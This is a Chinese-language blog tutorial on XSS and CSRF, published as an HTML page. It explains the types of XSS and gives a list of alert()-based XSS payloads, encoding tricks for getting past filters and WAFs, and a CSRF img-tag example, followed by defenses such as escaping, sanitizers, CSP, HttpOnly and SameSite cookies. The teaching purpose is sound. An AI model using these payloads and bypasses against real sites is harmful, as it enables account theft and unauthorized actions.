@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="Tracy-xu&#39;Blog">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Tracy Xu">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="XSS 和 CSRF"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Tracy-xu&#39;Blog" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Tracy-xu&#39;Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>XSS 和 CSRF - Tracy-xu&#39;Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/plugins/bootstrap/css/bootstrap.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom Fonts -->
+    <link href="/plugins/font-awesome/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Gallery -->
+    <link href="/plugins/featherlight/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Tracy-xu'Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    首页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    归档
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    分类
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    关于我
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2020/04/25/XSS-CSRF/">
+                XSS 和 CSRF
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-04-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/network/">network</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS (Cross-site scripting) 跨站脚本攻击，首字母缩写本应为 CSS，但因为 CSS 在网页设计领域已经被广泛指层叠样式表（Cascading Style Sheets），所以将意为“交叉”的 Cross 改以交叉形的 X 做为缩写。</p>
+<span id="more"></span>
+
+<p>XSS 是指攻击者利用网站没有对用户提交数据进行转义或过滤的缺点，在网站上注入恶意脚本，受害者在使用网站时恶意脚本被执行的攻击。注入脚本有 JavaScript、CSS、HTML，注入方法有很多，比如：表单提交、URL 参数、图片上传、外链等。XSS 的危害有盗取帐号、转账…。可搭建 <a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu 靶场</a>实验。</p>
+<p>从利用的角度上，XSS 可以分为 3 类：存储型、反射型、DOM 型，另外，如果自己注入的 XSS 脚本，仅能 XSS 到自己，则称为 Self XSS。不管哪种类型的 XSS，XSS 的本质就是让受害者浏览器执行攻击者插入的脚本，本质没有区别。</p>
+<ul>
+<li>存储型</li>
+</ul>
+<p>存储型 XSS 是指注入的脚本被存储在服务器中持久化的 XSS。在 IM、留言、文章、个人信息…这些场景中最常出现，是危害最大的 XSS。</p>
+<p>以 IM 为例，如果服务端在往数据库存入用户聊天数据时没做 XSS 处理，而正好 CSR 或者 SSR 渲染时又直接输出，这时则会出现漏洞。攻击者在聊天框中输入以下 Payload，所有在聊天室的人都将被攻击。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反射型</li>
+</ul>
+<p>反射型 XSS 是指将用户的输入反射给浏览器的一种 XSS。非持久化，与 DOM 型不同的是用户的输入在服务端渲染（字符串），常出现在搜索栏中，攻击者构造好含恶意代码参数的 URL后，欺骗受害者去访问。</p>
+<p>以如下<a target="_blank" rel="noopener" href="http://b-ref-xss-1s.lab.aqlab.cn/">搜索栏</a> SSR 代码为例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&#x27;&lt;%- $keyword %&gt;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&lt;%- $keyword %&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者构造 Payload 为 <code>&#39; oninput=alert(&#39;xss&#39;)//</code> 的 URL <code>meiyike.cn?keyword=%27%20oninput=alert(%27xss%27)//</code>，在浏览器上反射为以下形式，然后诱导受害者点击触发。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">oninput</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)//&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DOM 型</li>
+</ul>
+<p>DOM 型是通过对 DOM 树的修改而实现的 XSS，其本质上也属于反射型，只不过用户的输入在前端渲染（<code>innerHTML</code>、<code>appendChild</code>、<code>document.write</code>…），属于前端自身浏览器解析机制的漏洞，没有服务端的参与（存储型与反射型都需要服务器响应参与）。</p>
+<p>注：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">HTML5 规范中</a>指定不执行由 <code>innerHTML</code> 插入的 <code>&lt;script&gt;</code>。</p>
+<h3 id="Payload-和绕过方式"><a href="#Payload-和绕过方式" class="headerlink" title="Payload 和绕过方式"></a>Payload 和绕过方式</h3><ul>
+<li>Payload</li>
+</ul>
+<p>用以完成各种具体功能的 XSS 脚本，被称为 XSSPayload，常用 XSSPayload 有以下类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// img</span><br><span class="line">&lt;img src=# onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">// details</span><br><span class="line">&lt;details open ontoggle=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">// 表单</span><br><span class="line">&lt;select autofocus onfocus=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;textarea autofocus onfocus=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;input autofocus onfocus=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">// iframe</span><br><span class="line">&lt;iframe onload=alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">// 音视频</span><br><span class="line">&lt;video&gt;&lt;source onerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;audio src=#  onerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">// svg</span><br><span class="line">&lt;svg onload=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">// script</span><br><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可根据具体的输出点（value 属性中、html 标签中、script 标签中）来构造 Payload，比如在 value 属性中，可提前闭合属性和标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;[输出]&quot; type=text&gt;</span><br><span class="line">&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&#x27; oninput=alert(&#x27;xss&#x27;)//</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>绕过方式</li>
+</ul>
+<p>大多数 XSS 检查器或 WAF 都是利用黑名单或者白名单的形式对 XSS 攻击进行拦截，常见的绕过方式有以下几种。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">编码绕过</span><br><span class="line">Unicode 编码绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line">URL 编码绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">Ascii 编码绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br><span class="line">Hex 绕过</span><br><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br><span class="line">Base64 绕过</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">绕过空格过滤</span><br><span class="line">&lt;img/src=&quot;&quot;/onerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">绕过引号过滤</span><br><span class="line">&lt;img src=&quot;&quot; onerror=alert(`xss`)&gt;</span><br><span class="line"></span><br><span class="line">绕过括号过滤</span><br><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</span><br><span class="line"></span><br><span class="line">绕过关键字过滤</span><br><span class="line">&lt;ImG sRc=x onerRor=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>XSS 需要客户端和服务端来共同防范（DOM 型完全由客户端防范），常用的手段有，转义和过滤、CSP、HttpOnly。</p>
+<ul>
+<li>转义和过滤</li>
+</ul>
+<p>不要信任用户提交的数据，对用户的输入进行转义（escape）和过滤。各种类型的输出点转义和过滤规则不一样，输出在 HTML 标签之间和属性中（比如 value）时，要考虑 HTML 构造中的尖括号、双引号、”&amp;” 等关键字符，对输出进行 HTML Entity 编码转义，过滤移除用户输入中的 <code>style</code>、<code>script</code>、<code>iframe</code> 节点等，移除 <code>onerror</code> 等 DOM 属性，输出在 script 标签之间，则要考虑分号、注释、引号等关键字符。</p>
+<p>现在前端框架（React、Vue）都具有内置的 XSS 预防功能，标签会被转义输出。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xss = <span class="string">&#x27;&lt;img src=# onerror=&quot;alert(\&#x27;xss\&#x27;)&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;xss&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;img src=# onerror=&quot;alert(&#x27;xss&#x27;)&quot;&amp;gt;</span><br></pre></td></tr></table></figure>
+
+<p>对一定会渲染 HTML 的位置（富文本）需要使用 XSS 检查器过滤，比如 <a target="_blank" rel="noopener" href="https://github.com/apostrophecms/sanitize-html">sanitize-html</a>、<a target="_blank" rel="noopener" href="https://github.com/leizongmin/js-xss">js-xss</a>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sanitize <span class="keyword">from</span> <span class="string">&#x27;sanitize-html&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> xss = <span class="string">&#x27;&lt;img src=# onerror=&quot;alert(\&#x27;xss\&#x27;)&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">__html:</span> <span class="attr">sanitize</span>(<span class="attr">xss</span>)</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>在传统的服务端 SSR 中，原理一样。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- EJS 中使用 &lt;%= 代替 &lt;%- 实现 HTML 的转义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&lt;%= $keyword %&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>CSP</li>
+</ul>
+<p>内容安全策略 CSP (Content Security Policy) 可在服务端使用 HTTP 的 Content-Security-Policy 头部来指定策略，也可在前端通过 <code>meta</code> 标签设置。前端和服务端设置 CSP 的效果相同，但是 <code>meta</code> 无法使用 report。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;form-action &#x27;self&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面的配置只允许加载同域下的资源。</p>
+<ul>
+<li>HttpOnly</li>
+</ul>
+<p>对于以盗取 Cookie 为目的的 XSS，设置 Cookie 的 HttpOnly 属性是一种有效的防范手段。浏览器会禁止页面中的 JavaScript 访问带有 HttpOnly 属性的 Cookie。在 Express 下设置 httpOnly：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="title function_">cookie</span>(<span class="string">&#x27;sessionId&#x27;</span>, <span class="number">1</span>, &#123;<span class="attr">maxAge</span>: <span class="number">60</span> * <span class="number">1000</span>, <span class="attr">httpOnly</span>: <span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>对于存储型 XSS，服务端和客户端都需要正确进行过滤输出。</p>
+<p>防御的方法，一般认为是正确escape(转义)，就是替换尖括号、引号等特殊符号。但是这是不够的，因为这只解决了html的问题。考虑如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var name = &#x27;&lt;?= $name ?&gt;&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF (XSRF) 跨站请求伪造， 是一种冒充受信任用户，向服务器发送非预期请求的攻击方式。例如，用户登录网站 A，保留了会话 Cookie，然后用户被某些信息诱导访问危险网站 B，B 上提前构造好参数的 <code>img</code> 标签对 A 的服务端发起跨域 GET 请求，并且携带了 A 的 Cookie ，身份被冒用，请求被执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.example.com/index.php?action=delete&amp;id=123&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>造成 CSFR 的根本原因是跨域访问时的第三方 Cookie 携带。</p>
+<p>XHR、font… 这些 HTTP 请求默认都是同源策略的，但是 <code>img</code>、<code>link</code>、<code>script</code>、<code>iframe</code> 的 GET 请求允许 cross-origin，另外，CORS 也可用来打破同源策略，一旦设置不当，范围过宽，都会造成 CSRF 漏洞。</p>
+<h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><ul>
+<li>验证码</li>
+</ul>
+<p>添加验证码来识别是不是用户主动去发起请求，简单可靠，低成本，但对用户交互不友好。</p>
+<ul>
+<li>HTTP Referer</li>
+</ul>
+<p>HTTP 请求头 Referer 字段，记录了请求的来源地址，服务器验证这个来源地址是否合法即可。</p>
+<ul>
+<li>Samesite Cookie</li>
+</ul>
+<p>Cookie 的 Samesite 属性，用来声明 Cookie 是否仅限于第一方或者同一站点上下文。可用来防止 CSRF 攻击和用户追踪。Samesite 有三个属性值，分别是 <code>strict</code>、<code>lax</code> 和 <code>none</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="title function_">cookie</span>(<span class="string">&#x27;sessionId&#x27;</span>, <span class="number">1</span>, &#123;<span class="attr">samesite</span>: <span class="string">&#x27;lax&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><code>strict</code> 严格模式，表明 Cookie 在任何情况都不可能作为第三方的 Cookie。此时，在 B 站点下发起对 A 站点的任何请求，A 站点的 Cookie 都不会包含在 Cookie 请求头中。</p>
+<p><code>lax</code> 宽松模式，允许安全 HTTP 方法（<code>Get</code>、<code>OPTIONS</code> 、<code>HEAD</code>）携带 Cookie，但是不安全 HTTP 方法（<code>POST</code>、<code>PUT</code>、<code>DELETE</code>）不能携带。<code>Lax</code> 是 Chrome 80 起的默认设置。</p>
+<p><code>none</code> 没有限制，必须同时设置 Secure 属性（Cookie 只能通过 HTTPS 协议发送）。</p>
+<ul>
+<li>Tooken + 自定义 Header</li>
+</ul>
+<p>CSRF 依赖于 Cookie，如果不通过 Cookie 保持会话，则无法利用 CSRF 相关的攻击向量。可将会话保留在浏览器本地存储中，然后通过自定义 HTTP Header（比如 authorization）携带。</p>
+
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-4 col-lg-4 footer-about">
+                <h2>About</h2>
+                <p>
+                    享受编程和技术所带来的快乐
+                </p>
+            </div>
+            
+<div class="col-xs-12 col-sm-12 col-md-4 col-lg-4 footer-categories">
+    <h2>Categories</h2>
+    <p>
+        
+        <a class="footer-post" href="/categories/network/">network</a>
+        
+        <a class="footer-post" href="/categories/project/">project</a>
+        
+        <a class="footer-post" href="/categories/scratch/">scratch</a>
+        
+        <a class="footer-post" href="/categories/tools/">tools</a>
+        
+    </p>
+</div>
+
+            <div class="col-xs-12 col-sm-12 col-md-4 col-lg-4 footer-search">
+    <h2>Search</h2>
+    <form class="site-search-form">
+        <input type="text" id="local-search-input" class="st-search-input" />
+    </form>
+    <div id="local-search-result" class="local-search-result-cls"></div>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    Copyright©Tracy-xu'Blog. All Rights Reserved.
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="/plugins/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="/plugins/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="/plugins/featherlight/featherlight.min.js"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
